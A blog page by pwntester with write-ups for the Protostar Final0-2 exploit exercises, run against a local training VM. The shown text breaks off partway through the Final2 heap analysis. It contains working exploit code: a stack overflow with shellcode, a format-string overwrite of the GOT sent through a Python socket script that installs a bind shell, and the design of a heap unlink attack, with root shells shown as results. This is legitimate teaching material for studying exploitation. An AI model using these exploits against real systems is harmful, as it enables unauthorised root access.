@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Protostar Final0-3 write-ups</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="Final0 The application is expecting a username and then returns it in Upper case
+$ nc localhost 2995 alvaro No such user ALVARO  The buffer is 512 bytes long but we need to look for the EIP overwrite offset since the compiler can change the buffer size to align it or other nasty reasons. We start trying to segfault the program till we get it with:
+echo `python -c &#39;print &amp;quot;A&amp;quot;*532 &#43; &amp;quot;DDDD&amp;quot;&#39;` | nc localhost 2995  We can verify it with gdb and the core dump:">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Protostar Final0-3 write-ups">
+    <meta name="twitter:description" content="Final0 The application is expecting a username and then returns it in Upper case
+$ nc localhost 2995 alvaro No such user ALVARO  The buffer is 512 bytes long but we need to look for the EIP overwrite offset since the compiler can change the buffer size to align it or other nasty reasons. We start trying to segfault the program till we get it with:
+echo `python -c &#39;print &amp;quot;A&amp;quot;*532 &#43; &amp;quot;DDDD&amp;quot;&#39;` | nc localhost 2995  We can verify it with gdb and the core dump:">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Protostar Final0-3 write-ups">
+  <meta property="og:description" content="Final0 The application is expecting a username and then returns it in Upper case
+$ nc localhost 2995 alvaro No such user ALVARO  The buffer is 512 bytes long but we need to look for the EIP overwrite offset since the compiler can change the buffer size to align it or other nasty reasons. We start trying to segfault the program till we get it with:
+echo `python -c &#39;print &amp;quot;A&amp;quot;*532 &#43; &amp;quot;DDDD&amp;quot;&#39;` | nc localhost 2995  We can verify it with gdb and the core dump:">
+  <meta property="og:url" content="http://pwntester.com/blog/2013/12/26/protostar-final0-3-write-ups/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2013/12/26/protostar-final0-3-write-ups/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Protostar Final0-3 write-ups</h1>
+      <p class="post-meta">@pwntester · Dec 26, 2013 · 17 min read</p>
+    </header>
+    <article class="post-content">
+
+<h2 id="final0">Final0</h2>
+
+<p>The <a href="http://exploit-exercises.com/protostar/final0">application</a> is expecting a username and then returns it in Upper case</p>
+
+<pre><code class="language-lang-bash">$ nc localhost 2995
+alvaro
+No such user ALVARO
+</code></pre>
+
+<p>The buffer is 512 bytes long but we need to look for the EIP overwrite offset since the compiler can change the buffer size to align it or other nasty reasons. We start trying to segfault the program till we get it with:</p>
+
+<pre><code class="language-lang-bash">echo `python -c 'print &quot;A&quot;*532 + &quot;DDDD&quot;'` | nc localhost 2995
+</code></pre>
+
+<p>We can verify it with gdb and the core dump:</p>
+
+<pre><code class="language-lang-bash">root@protostar:~# gdb -q -c /tmp/core.11.final0.21580
+Core was generated by `/opt/protostar/bin/final0'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x44444444 in ?? ()
+</code></pre>
+
+<p>We will use a <strong>ret2text</strong> technique since there is call to <strong>strdup</strong> just before returning from the vulnerable function, so we will control <strong>eax</strong> and it will point to a copy of our input data in the heap. So the exploit should place the shellcode at the beggining of the user input (after a convenient <strong>NOP</strong> sled) followed by some garbage till we reach the <strong>EIP</strong> overwrite offset: 532</p>
+
+<p>We will need the &ldquo;call eax&rdquo; opcodes to be present in <strong>.text</strong></p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ objdump -M intel -d /opt/protostar/bin/final0 | grep &quot;call.*eax&quot;
+ 8048d18:	ff 14 85 9c ac 04 08 	call   DWORD PTR [eax*4+0x804ac9c]
+ 8048d5f:	ff d0                	call   eax
+ 804992b:	ff d0                	call   eax
+</code></pre>
+
+<p>We can verify the addresses content in gdb:</p>
+
+<pre><code class="language-lang-bash">root@protostar:~# gdb -q -c /tmp/core.11.final0.21781
+Core was generated by `/opt/protostar/bin/final0'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x44444444 in ?? ()
+(gdb) x/i 0x08048d5f
+0x8048d5f:	call   *%eax
+(gdb) x/i 0x0804992b
+0x804992b:	Cannot access memory at address 0x804992b
+</code></pre>
+
+<p>It seems that the only valid &ldquo;call eax&rdquo; address is &ldquo;0x08048d5f&rdquo;. We can use this address as the return address so we can jump to the address pointed by <strong>eax</strong> where our shellcode will be waiting for us:</p>
+
+<p>Lets verify what is in the memory pointed by eax:</p>
+
+<pre><code class="language-lang-bash">root@protostar:~# gdb -q -c /tmp/core.11.final0.21781
+Core was generated by `/opt/protostar/bin/final0'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x44444444 in ?? ()
+(gdb) i r eax
+eax            0x804b008	134524936
+(gdb) x/10x $eax
+0x804b008:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804b018:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804b028:	0x41414141	0x41414141
+(gdb) x/10x $eax -4
+0x804b004:	0x00000209	0x41414141	0x41414141	0x41414141
+0x804b014:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804b024:	0x41414141	0x41414141
+</code></pre>
+
+<p>So our A buffer starts right at the address pointed by eax, nice!</p>
+
+<p>We need a shellcode not containing lower case characters (within 0x61-0x7a range) so we will be using this <a href="http://www.exploit-db.com/exploits/13427/">shellcode</a></p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ echo `python -c 'print(&quot;\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xedDBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIAJDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJOBLAALMNIA&quot; + &quot;A&quot;*306 + &quot;\x5f\x8d\x04\x08&quot; + &quot;\n&quot;)'` | nc localhost 2995
+</code></pre>
+
+<p>Now from a different terminal:</p>
+
+<pre><code class="language-lang-bash">root@protostar:~# nc localhost 5074
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<h2 id="final1">Final1</h2>
+
+<p>First we need how to interact with the application which is expecting a username and then &ldquo;login&rdquo; followed with a password:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ nc localhost 2994
+[final1] $ username alvaro
+[final1] $ login passwd
+login failed
+</code></pre>
+
+<p>If we look at the syslog:</p>
+
+<pre><code class="language-lang-bash">Dec 22 15:48:18 protostar final1: Login from 127.0.0.1:39666 as [alvaro] with password [passwd]
+</code></pre>
+
+<p>The <a href="http://exploit-exercises.com/protostar/final1">level</a> is described as:</p>
+
+<blockquote>
+<p>This level is a remote blind format string level. The &lsquo;already written&rsquo; bytes can be variable, and is based upon the length of the IP address and port number.</p>
+
+<p>When you are exploiting this and you don&rsquo;t necessarily know your IP address and port number (proxy, NAT / DNAT, etc), you can determine that the string is properly aligned by seeing if it crashes or not when writing to an address you know is good.</p>
+</blockquote>
+
+<p>So we are supposed to exploit a format string vulnerability in the <strong>logit</strong> function:</p>
+
+<pre><code class="language-lang-bash">char buf[512];
+snprintf(buf, sizeof(buf), &quot;Login from %s as [%s] with password [%s]\n&quot;, hostname, username, pw);
+syslog(LOG_USER|LOG_DEBUG, buf);
+</code></pre>
+
+<p>The snprintf is not vulnerable to format string attack but <strong>syslog</strong> is since its syntax is:</p>
+
+<pre><code class="language-lang-bash">void syslog(int priority, const char *format, ...);
+</code></pre>
+
+<p>We can place our shellcode at <strong>&amp;username</strong> which we can control and its located at:</p>
+
+<pre><code class="language-lang-bash">(gdb) p &amp;username
+$4 = (char (*)[128]) 0x804a220
+</code></pre>
+
+<p>We need to find the position offset poiting to a controlled 4 bytes space. In order to do so, I will run this little script that uses a shellcode in the &ldquo;username&rdquo; and then it sends a password containing DDDD (the 4 bytes we want to control) and a format string reading memory from a given position. Our intention is to find the position where the DDDD block is:</p>
+
+<pre><code class="language-lang-bash">#!/usr/bin/python
+
+from socket import *
+from struct import *
+
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((&quot;localhost&quot;, 2994))
+
+#http://www.exploit-db.com/exploits/13427/
+shellcode = &quot;\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff&quot; \
+&quot;\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47&quot; \
+&quot;\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xed&quot; \
+&quot;DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB&quot; \
+&quot;AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA&quot; \
+&quot;JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO&quot; \
+&quot;BLAALMNIA&quot;
+
+for i in range(60):
+	s.send(&quot;username &quot; + &quot;\x90&quot;*16 + shellcode + &quot;\n&quot;)
+	s.send(&quot;login &quot; + &quot;DDDD[&quot; + str(i) + &quot;] %&quot; + str(i)+ &quot;$08x&quot; + &quot;\n&quot;)
+s.close()
+</code></pre>
+
+<p>&hellip; will produce a long output including:</p>
+
+<pre><code class="language-lang-bash">Dec 23 04:02:07 protostar final1: Login from 127.0.0.1:39732 as [�����������������#002�#005�����_������W^)ɀ��#007,A��#004G#002#007,A�#006FGI��DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAF] with password [DDDD[47] 2064726f]
+Dec 23 04:02:07 protostar final1: Login from 127.0.0.1:39732 as [�����������������#002�#005�����_������W^)ɀ��#007,A��#004G#002#007,A�#006FGI��DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAF] with password [DDDD[48] 4444445b]
+Dec 23 04:02:07 protostar final1: Login from 127.0.0.1:39732 as [�����������������#002�#005�����_������W^)ɀ��#007,A��#004G#002#007,A�#006FGI��DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAF] with password [DDDD[49] 39345b44]
+Dec 23 04:02:07 protostar final1: Login from 127.0.0.1:39732 as [�����������������#002�#005�����_������W^)ɀ��#007,A��#004G#002#007,A�#006FGI��DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAF] with password [DDDD[50] 3525205d]
+</code></pre>
+
+<p>So our DDDD block is split between position 48 and 49, We will run the script again but adding three chracters before our DDDD block in order to align it to a format string position.</p>
+
+<pre><code class="language-lang-bash">Dec 23 04:07:04 protostar final1: Login from 127.0.0.1:39733 as [�����������������#002�#005�����_������W^)ɀ��#007,A��#004G#002#007,A�#006FGI��DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAF] with password [XXXDDDD[49] 44444444]
+</code></pre>
+
+<p>Nice, now our DDDD is righ at 49 position. Now we will use the &ldquo;%n&rdquo; flag to write to a format string position. In this case to the number 49 that we control so we will write the number of bytes read so far to the address supplied instead of the DDDD block. As we want to overwrite a GOT entry to control program execution flow, we will find out the &ldquo;puts&rdquo; entry:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ objdump -TR /opt/protostar/bin/final1 | grep puts
+00000000      DF *UND*	00000000  GLIBC_2.0   puts
+0804a194 R_386_JUMP_SLOT   puts
+</code></pre>
+
+<p>Ok, lets try it so far, we will overwrite the GOT entry with an unknow number (the bytes written so far):</p>
+
+<pre><code class="language-lang-bash">s.send(&quot;username &quot; + &quot;\x90&quot;*16 + shellcode + &quot;\n&quot;)
+s.send(&quot;login &quot; + &quot;XXX&quot; + &quot;\x94\xa1\x04\x08&quot; + &quot;%49$08n&quot; + &quot;\n&quot;)
+</code></pre>
+
+<p>and we get</p>
+
+<pre><code class="language-lang-bash">Dec 23 04:15:55 protostar kernel: [391899.936862] final1[23024]: segfault at ac ip 000000ac sp bffffc2c error 4 in final1[8048000+2000]
+</code></pre>
+
+<p>Nice! a segfault, that means that we have successfully overwritten the <strong>puts</strong> entry in the GOT table with the value <strong>000000ac</strong> thats the number of charcters written before the format flag.</p>
+
+<p>So we need to write the &amp;username address in the puts GOT entry.
+Since the first 2 bytes are the same 0804, we can leave them untouched and just do a short write using the <strong>%hn</strong> flag. As an example:</p>
+
+<pre><code class="language-lang-bash">s.send(&quot;username &quot; + &quot;\x90&quot;*16 + shellcode + &quot;\n&quot;)
+s.send(&quot;login &quot; + &quot;XXX&quot; + &quot;\x94\xa1\x04\x08&quot; + &quot;%49$hn&quot; + &quot;\n&quot;)
+</code></pre>
+
+<p>and we get</p>
+
+<pre><code class="language-lang-bash">Dec 23 04:17:23 protostar kernel: [391988.195374] final1[23042]: segfault at 80400ac ip 080400ac sp bffffc2c error 4 in final1[8048000+2000]
+</code></pre>
+
+<p>We can see that our &ldquo;00ac&rdquo; is now only written in the two last bytes leaving the first two &ldquo;0804&rdquo; untouched. Now instead of &ldquo;00ac&rdquo; we need to write &ldquo;a220&rdquo; to point to the &ldquo;username&rdquo; address. So we need to write the decimal value: 41504</p>
+
+<p>a220-00ac(already written) = a174 = 41332</p>
+
+<pre><code class="language-lang-bash">s.send(&quot;username &quot; + &quot;\x90&quot;*16 + shellcode + &quot;\n&quot;)
+s.send(&quot;login &quot; + &quot;XXX&quot; + &quot;\x94\xa1\x04\x08&quot; + &quot;%41332d&quot; + &quot;%49$hn&quot; + &quot;\n&quot;)
+</code></pre>
+
+<p>Damn it! it crashes!</p>
+
+<pre><code class="language-lang-bash">Dec 23 04:41:58 protostar kernel: [393462.998619] final1[23234]: segfault at f9b452c1 ip 0804a277 sp bffffc14 error 4 in final1[804a000+1000]
+</code></pre>
+
+<p>If we check it with gdb:</p>
+
+<pre><code class="language-lang-bash">root@protostar:~# gdb -q -c /tmp/core.11.final1.23234
+Core was generated by `/opt/protostar/bin/final1'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x0804a277 in ?? ()
+(gdb) x/x 0x0804a194
+0x804a194:	0x0804a220
+</code></pre>
+
+<p>WAT??!?!?! so our exploit worked and we jumped to our shellcode but the shellcode crahsed
+We pick a different shellcode and adjust the username so it has the same lenght and no format string position changes:</p>
+
+<pre><code class="language-lang-bash">#!/usr/bin/python
+
+from socket import *
+from struct import *
+
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((&quot;localhost&quot;, 2994))
+
+#http://www.exploit-db.com/exploits/13427/
+shellcode = &quot;\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff&quot; \
+&quot;\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47&quot; \
+&quot;\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xed&quot; \
+&quot;DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB&quot; \
+&quot;AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA&quot; \
+&quot;JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO&quot; \
+&quot;BLAALMNIA&quot;
+print len(shellcode);
+
+shellcode2 = &quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&quot; \
+                &quot;\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&quot; \
+                &quot;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&quot; \
+                &quot;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&quot; \
+                &quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&quot; \
+                &quot;\x0b\xcd\x80&quot;
+print len(shellcode2)
+
+s.send(&quot;username &quot; + &quot;\x90&quot;*16 + shellcode2 + &quot;A&quot;*(len(shellcode) - len(shellcode2)) + &quot;\n&quot;)
+s.send(&quot;login &quot; + &quot;XXX&quot; + &quot;\x94\xa1\x04\x08&quot; + &quot;%41332d&quot; + &quot;%49$hn&quot; + &quot;\n&quot;)
+s.close()
+</code></pre>
+
+<p>and now it seems it works!:</p>
+
+<pre><code class="language-lang-bash">root@protostar:~# netstat -natp | grep 4444
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      23275/final1
+</code></pre>
+
+<p>Lets go for it:</p>
+
+<pre><code class="language-lang-bash">root@protostar:~# nc localhost 4444
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<h2 id="final2">Final2</h2>
+
+<p>This <a href="http://exploit-exercises.com/protostar/final2">level</a> is about remote heap explotation and that means that we have to find a place in the program where we are able to overwrite a chunk of memory with arbitrary contents and that chunk needs to be freed afterwards.
+If we read the code carefully we will find that the &ldquo;check_path&rdquo; function allows us to overwrite a chunk of memory since it uses &ldquo;memmove&rdquo; without checking its boundaries.</p>
+
+<pre><code class="language-lang-clike">void check_path(char *buf)
+{
+  char *start;
+  char *p;
+  int l;
+
+  /*
+   * Work out old software bug
+   */
+
+  p = rindex(buf, '/');
+  l = strlen(p);
+  if(p) {
+    start = strstr(buf, &quot;ROOT&quot;);
+    if(start) {
+      while(*start != '/') start--;
+      memmove(start, p, l);
+      printf(&quot;moving from %p to %p (exploit: %s / %d)\n&quot;, p, start, start &lt; buf ?
+      &quot;yes&quot; : &quot;no&quot;, start - buf);
+    }
+  }
+}
+</code></pre>
+
+<p>&ldquo;check_path&rdquo; is called from &ldquo;get_requests&rdquo; where a chunk of memory pointed by &ldquo;buf&rdquo; is reserved and we pass &ldquo;check_path&rdquo; a pointer to that buffer:</p>
+
+<pre><code class="language-lang-clike">int get_requests(int fd)
+{
+  char *buf;
+  char *destroylist[256];
+  int dll;
+  int i;
+
+  dll = 0;
+  while(1) {
+    if(dll &gt;= 255) break;
+
+    buf = calloc(REQSZ, 1);
+    if(read(fd, buf, REQSZ) != REQSZ) break;
+
+    if(strncmp(buf, &quot;FSRD&quot;, 4) != 0) break;
+
+    check_path(buf + 4);
+
+    dll++;
+  }
+
+  for(i = 0; i &lt; dll; i++) {
+                write(fd, &quot;Process OK\n&quot;, strlen(&quot;Process OK\n&quot;));
+    free(destroylist[i]);
+  }
+}
+</code></pre>
+
+<p>In addition, a call to &ldquo;free&rdquo; is done on the &ldquo;destroylist&rdquo; array. We will need to check what are those chunks pointing to since they are not declared in the code provided.</p>
+
+<p>This is a &ldquo;sane&rdquo; run of the program:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ python -c 'print &quot;FSRD&quot; + &quot;A&quot;*114 + &quot;/ROOT/TOOR&quot; + &quot;FSRD&quot; + &quot;B&quot;*114 + &quot;/ROOT/TOOR&quot;' | nc 127.0.0.1 2993
+Process OK
+Process OK
+Process OK
+</code></pre>
+
+<p>Ok, so if we analyze the &ldquo;check_path&rdquo; function we see a &ldquo;memmove(start, p , l)&rdquo; call that means that &ldquo;l&rdquo; bytes starting on &ldquo;p&rdquo; are going to be copied to &ldquo;start&rdquo; so if we want to overwrite a chunk&rsquo;s headers, we need to send at least to chunks and somehow when checking chunk2 path, make &ldquo;start&rdquo; point a chunk1 address. This is actually quite easy since the program does not check if &ldquo;start&rdquo; belongs to current chunk or not and just keep looking for a &ldquo;/&rdquo; backwards in memory.</p>
+
+<p>We know the following:</p>
+
+<ul>
+<li>each request is 128 bytes long</li>
+<li>each request must begin with &ldquo;FSRD&rdquo;</li>
+<li>check_path will copy whatever appears after the last &ldquo;/&rdquo; on a chunk to the address where it finds the first &ldquo;/&rdquo; before ROOT</li>
+</ul>
+
+<p>We want the following:</p>
+
+<ul>
+<li>overwrite chunk2 headers, that means that we need to place a &ldquo;/&rdquo; in the last byte of the first chunk</li>
+<li>we want to overwrite chunk2 headers in order to create a fake chunk with fd and bk pointers that allow us to overwrite an arbitrary address in memory</li>
+<li>we want to overwrite a GOTs table entry of a funtion called after the free() call and overwrite it with a an address pointing to a memory area we control</li>
+<li>we want to place a shellcode in that memory area that we control</li>
+</ul>
+
+<p>So lets design our chunks:</p>
+
+<ul>
+<li>Chunk1 = &ldquo;FSRD&rdquo; + &ldquo;X&rdquo;*(128 - 4 - 1) + &ldquo;/&rdquo;</li>
+<li>Chunk2 = &ldquo;FSRD&rdquo; + &ldquo;ROOT&rdquo; + &ldquo;/&rdquo; + &ldquo;new_chunk2_prev_size&rdquo; + &ldquo;new_chunk2_size&rdquo; + &ldquo;XXXX&rdquo; + fake_chunk_bk&rdquo; + &ldquo;fake_chunk_fd&rdquo; + &ldquo;NOP Sled&rdquo; + &ldquo;shellcode&rdquo;</li>
+</ul>
+
+<p>Where:</p>
+
+<ul>
+<li>new_chunk2_prev_size will be a negative value (-4) so we fool free() to think that the chunk to unlink from bin is 4 bytes ahead of the chunk2 address and thats right after chunk2 &ldquo;XXXX&rdquo;</li>
+<li>new_chunk2_size will be an arbitrary value ending in 0 so PREV_IN_USE will be false. That will make free() want to find that previous chunk and unlink it from &ldquo;bin&rdquo; in order to consolidate it with the chunk being freed before inserting the just consolidated chunk into &ldquo;bin&rdquo; again</li>
+</ul>
+
+<p>When unlink() is called on the fake chunk, the address stored in its fd pointer (*fd) will be copied to the address pointed in its bk-&gt;fd (bk + 12). *fd -&gt; bk + 12. So the address we want to overwrite will be placed in  (bk + 12)</p>
+
+<ul>
+<li>fake_chunk_fd = &amp;shellcode</li>
+<li>fake_chunk_bk = GOTs address - 12</li>
+</ul>
+
+<p>We need to know GOTs address of a function called after free(), we will be using the write call right after the free() call in the loop:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ objdump -TR /opt/protostar/bin/final2 | grep write
+00000000      DF *UND*	00000000  GLIBC_2.0   write
+00000000      DF *UND*	00000000  GLIBC_2.0   fwrite
+0804d41c R_386_JUMP_SLOT   write
+0804d468 R_386_JUMP_SLOT   fwrite
+</code></pre>
+
+<p>So the address we will be using in our exploit is 0x0804d41c - 0xc = 0x0804d410</p>
+
+<p>We also need to know what is chunk2 address so we can calculate the &amp;shellcode and we need to verify that the &ldquo;free(destroylist[i])&rdquo; is freeing our previously allocated chunks. We will use gdb and some breakpoints to find out these details:</p>
+
+<pre><code class="language-lang-bash">root@protostar:~# netstat -natp | grep final2
+tcp        0      0 0.0.0.0:2993            0.0.0.0:*               LISTEN      1301/final2
+</code></pre>
+
+<pre><code class="language-lang-bash">root@protostar:~# gdb -q /opt/protostar/bin/final2
+Reading symbols from /opt/protostar/bin/final2...done.
+(gdb) attach 1301
+Attaching to program: /opt/protostar/bin/final2, process 1301
+Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
+(no debugging symbols found)...done.
+Loaded symbols for /lib/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
+(no debugging symbols found)...done.
+Loaded symbols for /lib/ld-linux.so.2
+accept () at ../sysdeps/unix/sysv/linux/i386/socket.S:64
+64	../sysdeps/unix/sysv/linux/i386/socket.S: No such file or directory.
+	in ../sysdeps/unix/sysv/linux/i386/socket.S
+Current language:  auto
+The current source language is &quot;auto; currently asm&quot;.
+</code></pre>
+
+<p>We will set two breakpoints after calling &ldquo;calloc&rdquo; to check the return value and before calling &ldquo;free&rdquo; to check the free&rsquo;s argument:</p>
+
+<pre><code class="language-lang-bash">(gdb) disas get_requests
+Dump of assembler code for function get_requests:
+0x0804bd47 &lt;get_requests+0&gt;:	push   %ebp
+0x0804bd48 &lt;get_requests+1&gt;:	mov    %esp,%ebp
+0x0804bd4a &lt;get_requests+3&gt;:	sub    $0x428,%esp
+0x0804bd50 &lt;get_requests+9&gt;:	movl   $0x0,-0x10(%ebp)
+0x0804bd57 &lt;get_requests+16&gt;:	cmpl   $0xfe,-0x10(%ebp)
+0x0804bd5e &lt;get_requests+23&gt;:	jg     0x804bddb &lt;get_requests+148&gt;
+0x0804bd60 &lt;get_requests+25&gt;:	movl   $0x1,0x4(%esp)
+0x0804bd68 &lt;get_requests+33&gt;:	movl   $0x80,(%esp)
+0x0804bd6f &lt;get_requests+40&gt;:	call   0x804b4ee &lt;calloc&gt;
+0x0804bd74 &lt;get_requests+45&gt;:	mov    %eax,-0x14(%ebp)
+0x0804bd77 &lt;get_requests+48&gt;:	mov    -0x10(%ebp),%eax
